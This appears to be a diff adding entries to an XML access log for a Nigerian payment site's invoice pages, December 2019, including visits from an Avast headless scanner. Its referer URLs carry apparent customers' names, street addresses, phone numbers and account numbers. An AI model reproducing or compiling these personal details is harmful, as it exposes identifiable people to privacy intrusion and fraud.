+ <log>
+  <date>14-12-2019 22:53:41</date>
+  <ip>41.203.73.216</ip>
+  <hostname>41.203.73.216</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_137811</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=OLADEJI%20OLUBUNMI%20%20&amp;detail2=UP%20%20HILL%20%20SPRING%20%20SRT%20%20NEW%20%20SITE%20%20MADA%20Und%20St%20Madalla</referer>
+ </log>
+ <log>
+  <date>15-12-2019 15:31:59</date>
+  <ip>154.120.64.237</ip>
+  <hostname>154.120.64.237</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=238_132154</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=238</referer>
+ </log>
+ <log>
+  <date>15-12-2019 19:35:14</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=238_132154</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=238</referer>
+ </log>
+ <log>
+  <date>15-12-2019 21:47:14</date>
+  <ip>41.190.14.98</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=171_126828</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/index</referer>
+ </log>
+ <log>
+  <date>15-12-2019 22:17:24</date>
+  <ip>41.203.73.224</ip>
+  <hostname>41.203.73.224</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_137884</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08153239424&amp;detail2=08153239424</referer>
+ </log>
+ <log>
+  <date>15-12-2019 23:29:14</date>
+  <ip>41.203.73.231</ip>
+  <hostname>41.203.73.231</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137885</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=PASTOR%20ADELEKI%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>15-12-2019 23:34:50</date>
+  <ip>41.203.73.231</ip>
+  <hostname>41.203.73.231</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_121428</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>15-12-2019 23:36:47</date>
+  <ip>41.203.73.231</ip>
+  <hostname>41.203.73.231</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137887</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=VIRGINIA%20N%20AJAH%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>15-12-2019 23:40:10</date>
+  <ip>41.203.73.231</ip>
+  <hostname>41.203.73.231</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137889</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MRS%20MARY%20OGWUCHE%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>16-12-2019 09:35:07</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/7.0.185.1002 Safari/537.36</browser>
+  <request>/invoice&amp;id=287_138416</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=287</referer>
+ </log>
+ <log>
+  <date>16-12-2019 10:02:58</date>
+  <ip>41.190.14.28</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137526</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DANIEL%20MANZO%20RAMBAI%20%20JOY%20-&amp;detail2=2658921020</referer>
+ </log>
+ <log>
+  <date>16-12-2019 10:03:03</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137526</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>16-12-2019 10:03:06</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_137526</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>16-12-2019 12:15:35</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/7.0.185.1002 Safari/537.36</browser>
+  <request>/invoice&amp;id=287_138706</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=287</referer>
+ </log>
+ <log>
+  <date>16-12-2019 14:56:29</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=186_106801</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=186</referer>
+ </log>
+ <log>
+  <date>16-12-2019 18:38:38</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_137884</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08153239424&amp;detail2=08153239424</referer>
+ </log>
+ <log>
+  <date>16-12-2019 18:39:49</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_137884</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08153239424&amp;detail2=08153239424</referer>
+ </log>
+ <log>
+  <date>16-12-2019 18:46:28</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_140203</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=WUSE%20MARKET%20%20%20&amp;detail2=BLOCK%20B8%20SHOP%208%20Und%20St%20Zone%206</referer>
+ </log>
+ <log>
+  <date>16-12-2019 19:24:27</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_140203</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=WUSE%20MARKET%20%20%20&amp;detail2=BLOCK%20B8%20SHOP%208%20Und%20St%20Zone%206</referer>
+ </log>
+ <log>
+  <date>16-12-2019 19:26:20</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_140207</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=ISREAL%20EBUJE%20%20%20&amp;detail2=3%20OKE%20STRONG%20ARAB%20RD%20KUBWA%20%20Und%20St%20Byazhin</referer>
+ </log>
+ <log>
+  <date>16-12-2019 20:56:02</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_140236</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=SEROB%20LEGACY%20MOTEL%20%20%20%20&amp;detail2=dunamis%20church%20%20st%20apo%20133667529</referer>
+ </log>
+ <log>
+  <date>16-12-2019 20:57:01</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_140237</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=COMMUNITY%20COURT%20%20&amp;detail2=10%20dares%20salaam%20crescent%20o%20%20st%20central%20area5558755</referer>
+ </log>
+ <log>
+  <date>16-12-2019 20:58:01</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_140238</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=CROWN%20ESTATE%20%20%20%20&amp;detail2=no%202%20gurara%20street%20%20st%20maitama%20195625663</referer>
+ </log>
+ <log>
+  <date>16-12-2019 20:59:16</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_140240</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=BENJAMIN%20INIENGER%20%20%20%20&amp;detail2=43%20gana%20street%20maita%20%20st%20maitama%20194330219</referer>
+ </log>
+ <log>
+  <date>16-12-2019 21:00:23</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_140241</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=AFRIPROJECT%20CONSORTUIM%20%20%20%20&amp;detail2=plot%20no2197%20wuse%20zone%204%20%20st%20central%20area48426764</referer>
+ </log>
+ <log>
+  <date>17-12-2019 09:07:54</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_140207</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=ISREAL%20EBUJE%20%20%20&amp;detail2=3%20OKE%20STRONG%20ARAB%20RD%20KUBWA%20%20Und%20St%20Byazhin</referer>
+ </log>
+ <log>
+  <date>17-12-2019 09:09:00</date>
+  <ip>41.203.73.240</ip>
+  <hostname>41.203.73.240</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_140203</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>17-12-2019 13:29:11</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=194_141455</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=194</referer>
+ </log>
+ <log>
+  <date>17-12-2019 13:31:55</date>
+  <ip>154.120.64.235</ip>
+  <hostname>154.120.64.235</hostname>
+  <browser>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</browser>
+  <request>/invoice&amp;id=194_141455</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history&amp;ac=194</referer>
+ </log>
+ <log>
+  <date>17-12-2019 19:27:35</date>
+  <ip>197.210.85.206</ip>
+  <hostname>197.210.85.206</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_131035</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=LAWAL%20HARUNA%20KUKI&amp;detail2=2109585305</referer>
+ </log>
+ <log>
+  <date>17-12-2019 19:29:46</date>
+  <ip>197.210.85.206</ip>
+  <hostname>197.210.85.206</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_142202</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=08175550555&amp;detail2=08175550555</referer>
+ </log>
+ <log>
+  <date>17-12-2019 19:30:27</date>
+  <ip>197.210.85.206</ip>
+  <hostname>197.210.85.206</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_142202</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=08175550555&amp;detail2=08175550555</referer>
+ </log>
+ <log>
+  <date>17-12-2019 19:31:19</date>
+  <ip>197.210.85.206</ip>
+  <hostname>197.210.85.206</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 7.1.2; KFKAWI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36</browser>
+  <request>/invoice&amp;id=29_142205</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=08115555551&amp;detail2=08115555551</referer>
+ </log>
+ <log>
+  <date>18-12-2019 08:48:53</date>
+  <ip>197.211.58.94</ip>
+  <hostname>197.211.58.94</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_142543</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=SAVANNA%20SUITES%20LTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>18-12-2019 08:50:47</date>
+  <ip>197.211.58.94</ip>
+  <hostname>197.211.58.94</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_142555</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=SAVANNA%20SUITES%20LTD%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>18-12-2019 08:52:26</date>
+  <ip>197.211.58.94</ip>
+  <hostname>197.211.58.94</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_142560</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=STANZEL%20GRAND%20RESORT%20%20%20%20&amp;detail2=</referer>
+ </log>
+ <log>
+  <date>18-12-2019 10:08:52</date>
+  <ip>197.210.52.38</ip>
+  <hostname>197.210.52.38</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_142939</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=08091195268%20D-MFIN-2-5.5GB&amp;detail2=08091195268</referer>
+ </log>
+ <log>
+  <date>18-12-2019 15:06:55</date>
+  <ip>197.211.58.94</ip>
+  <hostname>197.211.58.94</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_143658</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=VALENCIA%20HOTEL%20%20%20%20&amp;detail2=blantyse%20streetoff%20ademol%20%20st%20central%20area541783165</referer>
+ </log>
+ <log>
+  <date>18-12-2019 21:40:59</date>
+  <ip>41.190.14.56</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_143935</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=07058883434&amp;detail2=07058883434</referer>
+ </log>
+ <log>
+  <date>19-12-2019 09:14:10</date>
+  <ip>41.203.73.249</ip>
+  <hostname>41.203.73.249</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144137</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=ELVIS%20GARDENS%20HOTEL%20%20%20%20&amp;detail2=aminu%20kano%20crescent%20%20st%20central%20area443260054</referer>
+ </log>
+ <log>
+  <date>19-12-2019 09:52:53</date>
+  <ip>41.203.73.249</ip>
+  <hostname>41.203.73.249</hostname>
+  <browser>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_140238</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/history</referer>
+ </log>
+ <log>
+  <date>19-12-2019 13:33:25</date>
+  <ip>41.190.14.56</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144751</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=DIAMOND%20BANK%20PLC%20%20%20%20&amp;detail2=nyanya%20keffi%20rdnya%20%20st%20karu17241297</referer>
+ </log>
+ <log>
+  <date>19-12-2019 13:33:32</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144751</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 13:33:32</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144751</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 14:54:24</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144751</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 14:54:25</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144751</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 15:05:58</date>
+  <ip>41.190.14.56</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144908</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MTN%20OFFICE%20%20%20%20&amp;detail2=26%20durban%20street%20wuse%202%20%20st%20central%20area18378521</referer>
+ </log>
+ <log>
+  <date>19-12-2019 15:06:02</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144908</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 15:06:03</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144908</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 15:10:10</date>
+  <ip>41.190.14.56</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144927</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MTN%20WAREHOUSE%20%20%20%20&amp;detail2=brifina%20hotel%20durumi%20%20st%20apo%20156317286</referer>
+ </log>
+ <log>
+  <date>19-12-2019 15:10:16</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144927</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 15:10:16</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_144927</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 16:16:38</date>
+  <ip>41.203.73.248</ip>
+  <hostname>41.203.73.248</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_145122</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08033311088&amp;detail2=08033311088</referer>
+ </log>
+ <log>
+  <date>19-12-2019 16:48:08</date>
+  <ip>41.190.14.56</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_145173</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MOBILE%20TELEPHONE%20%20&amp;detail2=4%20shehu%20shagari%20way%20%20st%20maitama%20119000799</referer>
+ </log>
+ <log>
+  <date>19-12-2019 16:48:13</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_145173</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 16:48:14</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_145173</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 17:50:45</date>
+  <ip>41.203.73.248</ip>
+  <hostname>41.203.73.248</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 5.1; TECNO PP7E-DLA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.96 Safari/537.36</browser>
+  <request>/invoice&amp;id=191_145122</request>
+  <score>0.5</score>
+  <referer>https://www.rechargepro.com.ng/confirmation&amp;detail1=08033311088&amp;detail2=08033311088</referer>
+ </log>
+ <log>
+  <date>19-12-2019 17:59:34</date>
+  <ip>41.190.14.56</ip>
+  <hostname>www.9mobile.com.ng</hostname>
+  <browser>Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36</browser>
+  <request>/invoice&amp;id=121_145173</request>
+  <score>0.5</score>
+  <referer>https://rechargepro.com.ng/confirmation&amp;detail1=MOBILE%20TELEPHONE%20%20&amp;detail2=4%20shehu%20shagari%20way%20%20st%20maitama%20119000799</referer>
+ </log>
+ <log>
+  <date>19-12-2019 17:59:37</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
+  <request>/invoice&amp;id=121_145173</request>
+  <score>0.5</score>
+  <referer>Unknown</referer>
+ </log>
+ <log>
+  <date>19-12-2019 17:59:38</date>
+  <ip>195.74.76.194</ip>
+  <hostname>r-194-076-074-195.avast.com</hostname>
+  <browser>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/67.0.3372.0 Safari/537.36</browser>
